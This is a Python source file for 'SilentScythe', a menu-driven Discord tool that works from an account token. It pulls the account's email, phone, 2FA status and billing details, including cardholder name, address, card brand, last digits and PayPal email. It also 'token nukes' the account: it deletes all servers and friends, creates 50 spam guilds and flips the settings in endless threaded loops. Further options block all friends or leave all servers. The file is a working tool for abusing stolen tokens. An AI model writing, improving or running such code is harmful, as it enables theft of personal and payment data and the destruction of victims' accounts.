import threading
import requests
import discord
import random
import time
import os
import asyncio
from colorama import Fore, init, Style
from itertools import cycle
from datetime import datetime, timezone

init(convert=True)
guildsIds = []
friendsIds = []
clear = lambda: os.system('cls')
clear()

def getheaders(token):
    return {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

def change_title():
    while True:
        
        os.system('title SilentScythe / Dev Build 1.00')
        time.sleep(1) 

        
        os.system('title SilentScythe \\ Dev Build 1.00')
        time.sleep(1)  


class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)

        for f in self.user.friends:
            friendsIds.append(f.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
            input("Press any key to exit...")
            exit(0)


async def leave_all_servers():
    print("Leaving all servers...")
    for guild in client.guilds:
        try:
            print(f"Leaving: {guild.name} ({guild.id})")
            await guild.leave()
        except Exception as e:
            print(f"Failed to leave {guild.name}: {e}")


from datetime import datetime

def grab_account_info(token):
    headers = getheaders(token)

    # Fetch user data
    r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if r.status_code != 200:
        print("Invalid token or failed to fetch user data.")
        return

    user = r.json()
    userID = user['id']
    userName = f"{user['username']}#{user['discriminator']}"
    avatar_id = user.get('avatar')
    email = user.get("email", "")
    phone = user.get("phone", "")
    mfa = user.get("mfa_enabled", False)
    language = user.get("locale", "Unknown")
    badges = user.get("public_flags", 0)
    creation_date = datetime.fromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000, tz=timezone.utc).strftime('%d-%m-%Y %H:%M:%S UTC')
    avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp' if avatar_id else ""

    # Nitro info
    nitro_data = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers).json()
    has_nitro = bool(nitro_data)
    days_left = "0"
    if has_nitro:
        try:
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = str(abs((d1 - d2).days))
        except:
            days_left = "?"

    # Credit card digit map
    cc_digits = {
        "visa": "4",
        "mastercard": "5",
        "amex": "3"
    }

    # Billing info
    billing_info = []
    billing_url = "https://discord.com/api/v9/users/@me/billing/payment-sources"
    billing_response = requests.get(billing_url, headers=headers)

    if billing_response.status_code == 200:
        for x in billing_response.json():
            y = x.get('billing_address', {})
            name = y.get('name', 'N/A')
            address_1 = y.get('line_1', 'N/A')
            address_2 = y.get('line_2', '')
            city = y.get('city', 'N/A')
            postal_code = y.get('postal_code', 'N/A')
            state = y.get('state', '')
            country = y.get('country', 'N/A')

            if x['type'] == 1:  # Credit Card
                cc_brand = x.get('brand', 'unknown')
                cc_first = cc_digits.get(cc_brand.lower(), '*')
                cc_last = x.get('last_4', '****')
                cc_month = str(x.get('expires_month', '00'))
                cc_year = str(x.get('expires_year', '00'))
                data = {
                    'Payment Type': 'Credit Card',
                    'Valid': not x.get('invalid', False),
                    'CC Holder Name': name,
                    'CC Brand': cc_brand.title(),
                    'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate(cc_first + '*' * 11 + cc_last)),
                    'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                    'Address 1': address_1,
                    'Address 2': address_2,
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state,
                    'Country': country,
                    'Default Payment': x.get('default', False)
                }
            elif x['type'] == 2:  # PayPal
                data = {
                    'Payment Type': 'PayPal',
                    'Valid': not x.get('invalid', False),
                    'PayPal Name': name,
                    'PayPal Email': x.get('email', 'N/A'),
                    'Address 1': address_1,
                    'Address 2': address_2,
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state,
                    'Country': country,
                    'Default Payment': x.get('default', False)
                }
            else:
                continue

            billing_info.append(data)

    # Output
    print(f'''
{Fore.RESET}{Fore.GREEN}####### Account Info #######{Fore.RESET}
[{Fore.LIGHTMAGENTA_EX}Username{Fore.RESET}]        {userName} | {userID}
[{Fore.LIGHTMAGENTA_EX}Badges{Fore.RESET}]          {badges}
[{Fore.LIGHTMAGENTA_EX}Language{Fore.RESET}]        {language}
[{Fore.LIGHTMAGENTA_EX}Created at{Fore.RESET}]      {creation_date}
[{Fore.LIGHTMAGENTA_EX}Avatar URL{Fore.RESET}]      {avatar_url}
[{Fore.LIGHTMAGENTA_EX}Account Token{Fore.RESET}]   {Fore.RED}{token}{Fore.RESET}

{Fore.RESET}{Fore.GREEN}####### Security Info #######{Fore.RESET}
[{Fore.LIGHTMAGENTA_EX}Email{Fore.RESET}]           {email}
[{Fore.LIGHTMAGENTA_EX}Phone Number{Fore.RESET}]    {phone}
[{Fore.LIGHTMAGENTA_EX}2 Factor{Fore.RESET}]        {mfa}

{Fore.RESET}{Fore.GREEN}####### Nitro Info #######{Fore.RESET}
[{Fore.LIGHTMAGENTA_EX}Nitro Status{Fore.RESET}]    {has_nitro}
[{Fore.LIGHTMAGENTA_EX}Expires in{Fore.RESET}]      {days_left} day(s)
''')

    if billing_info:
        print(f"{Fore.RESET}{Fore.GREEN}####### Billing Info #######{Fore.RESET}")
        for i, x in enumerate(billing_info):
            title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
            print(f'{title}\n{"=" * len(title)}')
            for key, val in x.items():
                if not val or key == 'Payment Type':
                    continue
                print(f"[{Fore.RED}{key:<23}{Fore.RESET}] {val}")
            print()

    input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to return: ')

def tokennuke(token):
    headers = {'Authorization': token}
    print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")

    for guild in guildsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)

    for friend in friendsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)

    for i in range(50):
        payload = {'name': f'Taids {i}', 'region': 'europe', 'icon': None, 'channels': None}
        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)

    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


def getbanner():
    banner = f'''{Fore.BLUE}{Style.BRIGHT}
             ___          
            /   \\        
       /\\  | . . \\       
     ////\\ |     ||       
   ////   \\ ___//\\       
  ///      \\\\     \\      
 ///       |\\\\     |     
//         | \\\\  \\   \\    
/          |  \\\\  \\   \\   
           |   \\\\ /   /   
           |    \\/   /    
           |     \\\\/|     
           |      \\\\|     
           |       \\\\     
           |        |     
           |_________\\{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}SilentScythe{Style.RESET_ALL}

{Fore.BLUE}[{Fore.BLUE}{Style.BRIGHT}1{Fore.BLUE}] {Fore.LIGHTBLACK_EX}Grab Info about the Account
{Fore.BLUE}[{Fore.BLUE}{Style.BRIGHT}2] {Fore.LIGHTBLACK_EX}Token Nuke the Account
{Fore.BLUE}[{Fore.BLUE}{Style.BRIGHT}3{Fore.BLUE}] {Fore.LIGHTBLACK_EX}Block all Friends
{Fore.BLUE}[{Fore.BLUE}{Style.BRIGHT}4{Fore.BLUE}] {Fore.LIGHTBLACK_EX}Leave All Servers
'''
    return banner


print(getbanner())


def startMenu():
    while True:
        clear()
        print(getbanner())
        print(f'[{Fore.BLUE}{Style.BRIGHT}>{Fore.LIGHTBLACK_EX}] Your choice', end='')
        choice = input('  :  ').strip()

        if choice == '1':
            token = input(f'[{Fore.RED}>{Fore.RESET}] Account token  :  ').strip()
            grab_account_info(token)

        elif choice == '2':
            token = input(f'[{Fore.RED}>{Fore.RESET}] Account token  :  ').strip()
            threads = input(f'[{Fore.RED}>{Fore.RESET}] Threads amount (number)  :  ').strip()

            Login().run(token)
            for _ in range(int(threads)):
                t = threading.Thread(target=tokennuke, args=(token,))
                t.start()

        elif choice == '3':
            token = input(f'[{Fore.RED}>{Fore.RESET}] Account token  :  ').strip()

            class BlockClient(discord.Client):
                async def on_ready(self):
                    print(f"Logged in as {self.user}")
                    print("Blocking all friends...")
                    count = 0
                    for friend in self.user.friends:
                        try:
                            await friend.block()
                            print(f"Blocked: {friend.name}#{friend.discriminator}")
                            count += 1
                            await asyncio.sleep(1)
                        except Exception as e:
                            print(f"Failed to block {friend.name}: {e}")
                    print(f"✅ Done. Blocked {count} friends.")
                    await self.close()

            client = BlockClient()
            try:
                client.run(token)
            except discord.LoginFailure:
                print("Invalid token. Please try again.")

        elif choice == "4":
            token = input("Enter your Discord token: ").strip()
            client = discord.Client()

            @client.event
            async def on_ready():
                print(f"Logged in as {client.user}")
                print("Leaving all servers...")
                for guild in client.guilds:
                    try:
                        print(f"Leaving: {guild.name} ({guild.id})")
                        await guild.leave()
                    except Exception as e:
                        print(f"Failed to leave {guild.name}: {e}")
                await client.close()

            try:
                client.run(token)
            except discord.LoginFailure:
                print("Invalid token. Please try again.")

        else:
            print(f"{Fore.RED}Invalid choice. Please select a valid option.{Fore.RESET}")

        input(f"\n{Fore.LIGHTBLACK_EX}Press Enter to return to the menu...{Fore.RESET}")


if __name__ == '__main__':
    # Start the title change loop in a background thread
    title_thread = threading.Thread(target=change_title, daemon=True)
    title_thread.start()

    startMenu()
